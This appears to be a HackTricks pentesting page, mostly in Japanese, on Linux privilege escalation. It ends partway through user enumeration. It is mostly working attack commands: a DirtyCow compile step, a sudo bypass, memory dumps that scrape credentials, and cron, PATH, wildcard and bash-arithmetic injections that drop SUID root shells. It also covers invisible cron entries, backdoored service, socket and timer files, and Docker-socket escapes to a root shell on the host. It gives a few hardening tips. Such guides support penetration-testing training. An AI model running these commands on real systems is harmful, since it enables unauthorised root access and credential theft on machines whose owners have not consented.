# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中の OS に関する情報を収集しましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし **`PATH` の任意のフォルダに書き込み権限がある** 場合、いくつかのライブラリやバイナリをhijackできる可能性があります:
```bash
echo $PATH
```
### 環境変数情報

環境変数に機密情報、パスワード、またはAPIキーは含まれていますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel versionを確認し、privilege escalationに使えるexploitがあるか調べる
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
脆弱なカーネルの良いリストと既に存在する**compiled exploits**はいくつか以下で見つけられます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
その他、**compiled exploits**が見つかるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブからすべての脆弱なカーネルバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルエクスプロイトの検索に役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

常に **Googleでカーネルのバージョンを検索** してください。あなたのカーネルのバージョンが既知のカーネルエクスプロイトで記載されている可能性があり、その場合そのエクスプロイトが有効であることを確認できます。

追加のカーネルエクスプロイト手法:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

以下に示されている脆弱な sudo バージョンに基づく:
```bash
searchsploit sudo
```
この grep を使用して sudo のバージョンが脆弱かどうか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo のバージョン 1.9.17p1 より前（**1.9.14 - 1.9.17 < 1.9.17p1**）では、ユーザ管理下のディレクトリから `/etc/nsswitch.conf` ファイルが読み込まれる場合に、権限のないローカルユーザが sudo `--chroot` オプションを利用して root に権限昇格できてしまいます。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). エクスプロイトを実行する前に、`sudo` のバージョンが脆弱であり `chroot` 機能をサポートしていることを確認してください。

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 署名検証に失敗しました

**smasher2 box of HTB** を確認すると、この vuln がどのように悪用されるかの **例** が分かります。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御手段を列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container の中にいる場合、そこから脱出を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

どこが**mounted and unmounted**になっているか、どこで・なぜそうなっているかを確認してください。もし何かがunmountedであれば、それをmountして機密情報を確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**確認してください。これは、kernel exploit を使用する必要がある場合に有用です。使用するマシン（またはそれに類似したマシン）でコンパイルすることが推奨されているためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

**インストール済みパッケージとサービスのバージョン**を確認してください。例えば古い Nagios バージョンが存在し、escalating privileges を達成するために悪用される可能性があります…\  
より怪しいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
もしマシンにSSHでアクセスできるなら、マシン内にインストールされているソフトウェアが古く脆弱かどうかを確認するために、**openVAS**を使うこともできます。

> [!NOTE] > _これらのコマンドは大量のほとんど役に立たない情報を表示することがある点に注意してください。したがって、インストールされているソフトウェアのバージョンが既知のエクスプロイトに対して脆弱かどうかをチェックする OpenVAS などのアプリケーションを使うことを推奨します。_

## プロセス

実行されている**プロセスが何か**を確認し、どのプロセスが**本来より多くの権限を持っているか**をチェックしてください（例えば、tomcat が root によって実行されているなど）。
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
また、**processes binaries** に対する権限を確認してください。上書きできる可能性があります。

### Process monitoring

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使ってプロセスを監視できます。これは、脆弱なプロセスが頻繁に実行されている場合や、特定の要件が満たされたときに実行されるプロセスを特定するのに非常に有用です。

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
通常、他のユーザに属するプロセスのメモリを読むには **root privileges** が必要になるため、これは通常すでに root であり、さらに認証情報を発見したい場合により有用です。\
ただし、**as a regular user you can read the memory of the processes you own** ことを忘れないでください。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDに対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示し、**それぞれの**マッピング領域のアクセス権**も表示します。**mem** 擬似ファイルは**プロセスのメモリ自体を公開します**。**maps** ファイルから、どの**メモリ領域が読み取り可能か**とそのオフセットが分かります。私たちはこの情報を使って **seek into the mem file and dump all readable regions** を行い、ファイルに書き出します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理**メモリへのアクセスを提供し、仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます.\

通常、`/dev/mem` は **root** と kmem グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump (linux 用)

ProcDump は、Sysinternals スイートの Windows 向けの古典的な ProcDump ツールを linux 向けに再構想したものです。入手先: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをdumpするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でrootの要件を取り除き、あなたが所有するプロセスをdumpできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要)

### プロセスメモリからの認証情報

#### 手動の例

authenticator プロセスが実行中であることが分かった場合：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをdumpし（前のセクションを参照して、dump the memory of a processするさまざまな方法を確認してください）、memory内でcredentialsを検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は**メモリから平文の資格情報を窃取**し、いくつかの**既知のファイル**からも取得します。正しく動作させるには root privileges が必要です。

| 機能                                             | プロセス名             |
| ------------------------------------------------- | -------------------- |
| GDM のパスワード (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (アクティブ FTP 接続)                   | vsftpd               |
| Apache2 (アクティブな HTTP Basic Auth セッション)         | apache2              |
| OpenSSH (アクティブな SSH セッション - sudo 使用)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュール/Cron ジョブ

### Crontab UI (alseambusher) が root で実行されている — Webベースのスケジューラ privesc

webの “Crontab UI” パネル (alseambusher/crontab-ui) が root で実行され、ループバックにのみバインドされている場合でも、SSH ローカルポートフォワーディングで到達して特権ジョブを作成し権限昇格できます。

典型的な流れ
- ループバックのみのポートを検出（例: 127.0.0.1:8000）し、`ss -ntlp` / `curl -v localhost:8000` で Basic-Auth realm を確認
- 運用アーティファクトから認証情報を見つける:
- バックアップ/スクリプト（例: `zip -P <password>`）
- systemd ユニット内に `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` が含まれている
- トンネルしてログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成して即実行する(SUID shell をドロップする):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
ハードニング
- Do not run Crontab UI as root; 専用ユーザーと最小権限で制限する
- localhostにバインドし、さらにfirewall/VPNでアクセスを制限する; パスワードを使い回さない
- unit filesにシークレットを埋め込まない; secret storesかroot-only EnvironmentFileを使用する
- オンデマンドのジョブ実行に対してaudit/loggingを有効にする



スケジュールされたジョブが脆弱か確認する。rootで実行されるスクリプトを利用できるかもしれない（wildcard vuln? rootが使うファイルを変更できるか? symlinksを使う? rootが使うディレクトリに特定のファイルを作成する?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_/etc/crontab_ の中で PATH を見ると、次のようになっています: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー "user" が /home/user に対して書き込み権限を持っていることに注意_)

この crontab 内で root が PATH を設定せずにコマンドやスクリプトを実行しようとする場合。例えば: _\* \* \* \* root overwrite.sh_\
その場合、次のようにして root シェルを取得できます：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、予期しない動作（privesc のような）を引き起こすように悪用できます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**もし wildcard が /some/path/\* のようなパスの前に付く場合** _**/some/path/\***_ **、脆弱ではありません（** _**./\***_ **もそうではありません）。**

次のページを参照すると、より多くの wildcard exploitation tricks が読めます:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash は ((...))、$((...)) および let における arithmetic evaluation の前に parameter expansion と command substitution を行います。もし root cron/parser が untrusted log fields を読み取り、それらを arithmetic context に渡すと、攻撃者はコマンド置換 $(...) を注入して、cron 実行時に root として実行させることができます。

- Why it works: Bash では展開が次の順序で発生します: parameter/variable expansion、command substitution、arithmetic expansion、その後に word splitting と pathname expansion。したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換され（コマンドが実行され）、残った数値の `0` が算術に使われるためスクリプトはエラーにならずに続行します。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log に attacker-controlled なテキストを書き込み、数値に見えるフィールドが command substitution を含み末尾が数字になるようにします。arithmetic を有効に保つため、コマンドは stdout に何も出力しない（またはリダイレクトする）ようにしてください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

もしあなたが root によって実行される **cron script** を変更できるなら、非常に簡単に shell を取得できます：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootによって実行されるscriptが、あなたが完全にアクセスできる**ディレクトリ**を使っている場合、そのフォルダを削除してあなたが制御するscriptを置く別の場所を指す**symlinkフォルダを作成する**ことが有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁に実行される cron ジョブ

プロセスを監視して、1分、2分、または5分ごとに実行されているプロセスを探せます。うまく利用すれば、escalate privileges できるかもしれません。

例えば、**0.1秒ごとに1分間監視し**、**実行回数の少ない順にソートし**、最も多く実行されたコマンドを削除するには、次のように実行します:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (起動したすべてのプロセスを監視・列挙します)。

### 見えない cron jobs

コメントの後に**キャリッジリターンを入れる**（改行文字なしで）ことで cronjob を作成でき、cron job は動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。書き込み可能であれば、**それを変更して**サービスが**開始されたとき**、**再起動されたとき**、または**停止されたとき**にあなたの**backdoor**を**実行する**ようにできます（マシンを再起動するまで待つ必要があるかもしれません）。\
例えば、`.service` ファイル内に backdoor を作成し、**`ExecStart=/tmp/script.sh`** のようにします。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリに対して**書き込み権限がある**場合、それらを変更して backdoors を仕込むことができ、サービスが再実行されたときに backdoors が実行されます。

### systemd PATH - 相対パス

**systemd** が使用する PATH は次で確認できます:
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**write**できることが分かった場合、**escalate privileges**できる可能性があります。サービスの設定ファイルで**relative paths being used on service configurations**が使われている箇所を検索する必要があります。例えば:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
その後、書き込み可能な systemd の PATH フォルダ内に、相対パスのバイナリと同じ名前の実行可能ファイルを作成します。サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたのバックドアが実行されます（通常、権限のないユーザーはサービスを開始/停止できませんが、`sudo -l` が使えるか確認してください）。

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** は名前が `**.timer**` で終わる systemd の unit ファイルで、`**.service**` ファイルやイベントを制御します。**Timers** はカレンダー時間イベントや単調時間イベントをネイティブにサポートし、非同期に実行できるため、cron の代替として使用できます。

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できる場合、既存の systemd.unit（例えば `.service` や `.target`）のいずれかを実行させることができます
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> このタイマーが期限切れになったときにアクティブ化される Unit。引数は接尾辞が ".timer" でない unit name です。指定されていない場合、この値はタイマー unit と同じ名前（接尾辞を除く）を持つ service にデフォルトされます。（上記参照。）アクティブ化される unit name とタイマーの unit name は、接尾辞を除いて同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- systemd unit（例: `.service`）で、**書き込み可能なバイナリを実行している**ものを見つける
- **相対パスを実行している** systemd unit を見つけ、かつ **systemd PATH** に対して **書き込み権限** を持っている（その実行ファイルを偽装するため）

**Learn more about timers with `man systemd.timer`.**

### **Timer の有効化**

Timer を有効化するには root 権限が必要で、次を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**sockets については `man systemd.socket` を参照してください。** このファイル内では、いくつかの興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは種類が異なりますが、要するにソケットが**どこで待ち受けるかを示す**ためのものです（AF_UNIX ソケットファイルのパス、待ち受ける IPv4/6 および/またはポート番号など）。
- `Accept`: ブール引数を取ります。もし **true** であれば、着信ごとにサービスインスタンスが生成され、その接続ソケットのみが渡されます。もし **false** であれば、すべての待ち受けソケット自体が起動された service ユニットに渡され、すべての接続に対して1つのサービスユニットのみが生成されます。この値は datagram ソケットや FIFO では無視され、これらでは単一のサービスユニットが無条件にすべての着信を処理します。**Defaults to false**。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法で書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、リッスンする **sockets**/FIFO がそれぞれ**作成されてバインドされる前**または**後**に実行されます。コマンドラインの最初のトークンは絶対パスのファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする **sockets**/FIFO がそれぞれ**閉じられて削除される前**または**後**に実行される追加の**コマンド**です。
- `Service`: 着信トラフィック時に**有効化する** service ユニット名を指定します。この設定は `Accept=no` のソケットでのみ許可されます。デフォルトではソケットと同じ名前の service（サフィックスを置換したもの）になります。ほとんどの場合、このオプションを使う必要はありません。

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_システムがその socket ファイルの設定を実際に使用していないと、backdoor は実行されません_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意: 一部に **sockets listening for HTTP** requests が存在する場合があることに注意してください (_.socket files のことではなく、unix sockets として動作するファイルのことを指しています_)。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **responds with an HTTP** request, then you can **communicate** with it and maybe **exploit some vulnerability**.

### 書き込み可能な Docker ソケット

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムに対してroot権限でアクセスするコンテナを実行することを可能にします。

#### **Docker API を直接使用する**

Docker CLI が利用できない場合でも、Docker socket は Docker API と `curl` コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送ります。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

作成したコンテナを起動する：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使ってコンテナに接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定すると、ホストのファイルシステムに対するroot権限でコンテナ内で直接コマンドを実行できます。

### Others

group `docker` の中にいて docker socket に対して書き込み権限がある場合、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) が存在することに注意してください。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) の場合、それを侵害できる可能性もあります。

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は、アプリケーションが効率的にやり取りやデータ共有を行うことを可能にする洗練された inter-Process Communication (IPC) system です。近代的な Linux システムを念頭に設計されており、さまざまな形態のアプリケーション間通信に対する堅牢なフレームワークを提供します。

このシステムは柔軟で、プロセス間のデータ交換を強化する基本的な IPC をサポートしており、これは **enhanced UNIX domain sockets** を想起させます。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetooth デーモンからの着信通話に関するシグナルが音楽プレーヤーにミュートを促すといった動作はユーザー体験を向上させます。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、サービス要求やメソッド呼び出しを簡素化し、従来は複雑であった処理を効率化します。

D-Bus は **allow/deny model** に基づいて動作し、ポリシールールの総合的な一致に基づいてメッセージの権限（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーはバスとのやり取りを指定し、許可の悪用によって privilege escalation を引き起こす可能性があります。

例として、`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるポリシーが示されており、root ユーザーが `fi.w1.wpa_supplicant1` をオーナーにでき、送信および受信できる権限が詳細に記述されています。

ユーザーやグループが指定されていないポリシーは全てに適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus communication を列挙して悪用する方法を学ぶ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを列挙してマシンの位置を把握するのは常に有益です。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

アクセスする前に操作できなかったマシン上で動作しているネットワークサービスは必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

traffic を sniff できるか確認してください。もしできれば、いくつかの credentials を取得できる可能性があります。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**who**で、どの**privileges**を持っているか、システムにどの**users**がいるか、どの**users**が**login**できるか、どのユーザーが**root privileges**を持っているかを確認してください：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
